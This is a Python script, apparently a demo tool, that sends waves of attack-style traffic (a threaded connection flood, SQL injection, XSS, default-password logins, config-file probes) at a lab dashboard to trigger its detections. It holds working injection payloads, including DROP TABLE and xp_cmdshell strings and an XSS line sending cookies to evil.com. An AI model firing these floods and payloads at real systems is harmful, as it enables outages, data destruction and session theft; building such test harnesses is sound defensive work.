"""
GRASP Chaos Attacker - Multi-Vector Attack Simulator
=====================================================
Run this on the ATTACKER laptop to trigger multiple attack types
on the GRASP dashboard simultaneously.

Usage:  python chaos_attacker.py
        python chaos_attacker.py --target 192.168.1.2 --port 8000
"""
import socket
import threading
import time
import random
import sys
import urllib.request
import urllib.error
import urllib.parse

# ─── CONFIGURATION ───
TARGET_IP   = "192.168.1.2"     # Victim laptop IP (GRASP backend)
TARGET_PORT = 8000              # Backend port
THREADS_PER_ATTACK = 5          # Threads per attack wave

# Override from command line
for i, arg in enumerate(sys.argv):
    if arg == "--target" and i + 1 < len(sys.argv):
        TARGET_IP = sys.argv[i + 1]
    if arg == "--port" and i + 1 < len(sys.argv):
        TARGET_PORT = int(sys.argv[i + 1])

BASE_URL = f"http://{TARGET_IP}:{TARGET_PORT}"

# ─── Attack Payloads ───

SQLI_PAYLOADS = [
    "/?id=1' OR 1=1 --",
    "/?user=admin' UNION SELECT * FROM users --",
    "/?search='; DROP TABLE patients; --",
    "/?id=1; EXEC xp_cmdshell('whoami')",
    "/?login=admin'--&password=x",
    "/?q=1' AND 1=1 UNION SELECT NULL,NULL,NULL --",
    "/?name='; INSERT INTO admin VALUES('hacker','pass'); --",
    "/?id=0x31 OR 0x32=0x32",
    "/?filter=1' DELETE FROM records WHERE '1'='1",
    "/?sort=name; UPDATE users SET role='admin' WHERE 1=1 --",
]

XSS_PAYLOADS = [
    "/?search=<script>alert('XSS')</script>",
    "/?name=<img src=x onerror=alert(1)>",
    "/?q=<svg onload=alert(document.cookie)>",
    "/?input=<iframe src=javascript:alert(1)>",
    "/?msg=<script>eval(atob('YWxlcnQoMSk='))</script>",
    "/?comment=<img src=x onerror=fetch('http://evil.com/steal?c='+document.cookie)>",
    "/?title=<svg/onload=alert('XSS')>",
    "/?bio=javascript:alert(1)//",
]

BRUTE_FORCE_PATHS = [
    "/login?user=admin&pass=password123",
    "/login?user=admin&pass=admin",
    "/login?user=root&pass=toor",
    "/api/auth/signin?username=admin&password=letmein",
    "/wp-login.php?log=admin&pwd=pass",
    "/admin/login?u=administrator&p=12345",
    "/api/token?grant_type=password&username=admin&password=qwerty",
    "/signin?email=admin@grasp.io&password=hunter2",
    "/api/session?user=admin&pass=welcome1",
    "/auth/login?user=root&password=password",
]

RANSOMWARE_PATHS = [
    "/upload/report.pdf.encrypted",
    "/api/decrypt?key=bitcoin_wallet_3FZbgi29",
    "/files/patient_data.locked",
    "/ransom/wannacry_decrypt_key",
    "/download/cryptolocker_payload",
    "/api/wallet/bitcoin/payment",
    "/files/database_backup.encrypted",
    "/decrypt/unlock_files_now",
]

C2_BEACON_PATHS = [
    "/api/beacon?id=agent-445&status=alive",
    "/heartbeat?implant=trojan_x&interval=30",
    "/c2/callback?payload=stage2_ready",
    "/api/exfil?data=base64encodedstuff",
    "/backdoor/reverse_shell?port=4444",
    "/c2/implant/checkin?agent_id=APT29",
    "/beacon/heartbeat?interval=60&jitter=10",
    "/callback?payload_status=delivered",
]

PORT_SCAN_PATHS = [
    "/",
    "/admin",
    "/config",
    "/.env",
    "/wp-admin",
    "/phpmyadmin",
    "/api/v1/status",
    "/server-status",
    "/.git/config",
    "/robots.txt",
    "/sitemap.xml",
    "/api/debug",
]


def send_request(url):
    """Send a single HTTP request, ignoring all errors."""
    try:
        req = urllib.request.Request(url, headers={
            "User-Agent": "Mozilla/5.0 (compatible; ChaosAttacker/1.0)"
        })
        urllib.request.urlopen(req, timeout=2)
    except:
        pass


def ddos_flood(duration=8):
    """Phase 1: Volumetric DDoS - slam the server with raw connections."""
    print("[PHASE 1] DDoS Volumetric Flood...")
    end_time = time.time() + duration
    
    def flood():
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((TARGET_IP, TARGET_PORT))
                s.send(b"GET / HTTP/1.1\r\nHost: " + TARGET_IP.encode() + b"\r\n\r\n")
                s.close()
            except:
                pass
    
    threads = []
    for _ in range(THREADS_PER_ATTACK * 4):  # More threads for DDoS
        t = threading.Thread(target=flood, daemon=True)
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join(timeout=duration + 2)
    print("         DDoS phase complete.\n")


def sqli_attack(rounds=3):
    """Phase 2: SQL Injection probes."""
    print("[PHASE 2] SQL Injection Attack...")
    for r in range(rounds):
        for payload in SQLI_PAYLOADS:
            url = BASE_URL + payload
            send_request(url)
            time.sleep(0.2)
        time.sleep(1)
    print("         SQLi phase complete.\n")


def xss_attack(rounds=3):
    """Phase 3: Cross-Site Scripting probes."""
    print("[PHASE 3] XSS Attack...")
    for r in range(rounds):
        for payload in XSS_PAYLOADS:
            url = BASE_URL + urllib.parse.quote(payload, safe='/:?=&<>()\'";')
            send_request(url)
            time.sleep(0.2)
        time.sleep(1)
    print("         XSS phase complete.\n")


def brute_force_attack(rounds=3):
    """Phase 4: Brute Force login attempts."""
    print("[PHASE 4] Brute Force Attack...")
    for r in range(rounds):
        for path in BRUTE_FORCE_PATHS:
            url = BASE_URL + path
            send_request(url)
            time.sleep(0.15)
        time.sleep(0.5)
    print("         Brute force phase complete.\n")


def ransomware_probe(rounds=2):
    """Phase 5: Ransomware indicator probes."""
    print("[PHASE 5] Ransomware Indicators...")
    for r in range(rounds):
        for path in RANSOMWARE_PATHS:
            url = BASE_URL + path
            send_request(url)
            time.sleep(0.3)
        time.sleep(1)
    print("         Ransomware phase complete.\n")


def c2_beaconing(rounds=2):
    """Phase 6: C2 Command-and-Control beaconing."""
    print("[PHASE 6] C2 Beaconing...")
    for r in range(rounds):
        for path in C2_BEACON_PATHS:
            url = BASE_URL + path
            send_request(url)
            time.sleep(0.4)
        time.sleep(1)
    print("         C2 beaconing phase complete.\n")


def port_scan_probe(rounds=3):
    """Phase 7: Rapid endpoint probing (simulates port scan)."""
    print("[PHASE 7] Port Scan / Endpoint Probing...")
    for r in range(rounds):
        for path in PORT_SCAN_PATHS:
            url = BASE_URL + path
            send_request(url)
            time.sleep(0.05)
        time.sleep(0.5)
    print("         Port scan phase complete.\n")


def chaos_mode():
    """Randomly interleave all attack types for maximum dashboard impact."""
    print("[CHAOS MODE] Randomly mixing all attack vectors...")
    all_attacks = []
    
    # Build pool of individual attack requests
    for _ in range(3):
        for p in SQLI_PAYLOADS:
            all_attacks.append(("SQLi", BASE_URL + p))
        for p in XSS_PAYLOADS:
            all_attacks.append(("XSS", BASE_URL + urllib.parse.quote(p, safe='/:?=&<>()\'";')))
        for p in BRUTE_FORCE_PATHS:
            all_attacks.append(("BruteForce", BASE_URL + p))
        for p in RANSOMWARE_PATHS:
            all_attacks.append(("Ransomware", BASE_URL + p))
        for p in C2_BEACON_PATHS:
            all_attacks.append(("C2", BASE_URL + p))
        for p in PORT_SCAN_PATHS:
            all_attacks.append(("PortScan", BASE_URL + p))
    
    random.shuffle(all_attacks)
    
    for i, (label, url) in enumerate(all_attacks):
        send_request(url)
        if i % 10 == 0:
            print(f"         Sent {i}/{len(all_attacks)} attacks ({label})...")
        time.sleep(random.uniform(0.05, 0.3))
    
    print("         Chaos mode complete.\n")


# ─── Main Execution ───
if __name__ == "__main__":
    print("=" * 60)
    print("  GRASP Chaos Attacker - Multi-Vector Attack Simulator")
    print("=" * 60)
    print(f"  Target:  {TARGET_IP}:{TARGET_PORT}")
    print(f"  Attacks: DDoS, SQLi, XSS, Brute Force,")
    print(f"           Ransomware, C2 Beacon, Port Scan")
    print("=" * 60)
    print()
    
    mode = input("Select mode:\n"
                 "  [1] Sequential  (run each attack one by one)\n"
                 "  [2] Chaos       (randomly mix everything)\n"
                 "  [3] DDoS only\n"
                 "  [4] SQLi only\n"
                 "  [5] XSS only\n"
                 "  [6] Brute Force only\n"
                 "  [7] Full Sequential + Chaos Finale\n"
                 "\n> ").strip()
    
    print()
    
    if mode == "1":
        ddos_flood(6)
        sqli_attack()
        xss_attack()
        brute_force_attack()
        ransomware_probe()
        c2_beaconing()
        port_scan_probe()
    elif mode == "2":
        chaos_mode()
    elif mode == "3":
        ddos_flood(15)
    elif mode == "4":
        sqli_attack(5)
    elif mode == "5":
        xss_attack(5)
    elif mode == "6":
        brute_force_attack(5)
    elif mode == "7":
        print(">>> FULL DEMO SEQUENCE <<<\n")
        ddos_flood(6)
        time.sleep(2)
        sqli_attack(2)
        time.sleep(2)
        xss_attack(2)
        time.sleep(2)
        brute_force_attack(2)
        time.sleep(2)
        ransomware_probe()
        time.sleep(2)
        c2_beaconing()
        time.sleep(2)
        port_scan_probe()
        time.sleep(3)
        print(">>> CHAOS FINALE <<<\n")
        chaos_mode()
    else:
        print("Invalid selection. Running sequential mode...")
        ddos_flood(6)
        sqli_attack()
        xss_attack()
        brute_force_attack()
    
    print("=" * 60)
    print("  Attack simulation complete!")
    print("  Check the GRASP Dashboard on the Victim laptop.")
    print("=" * 60)
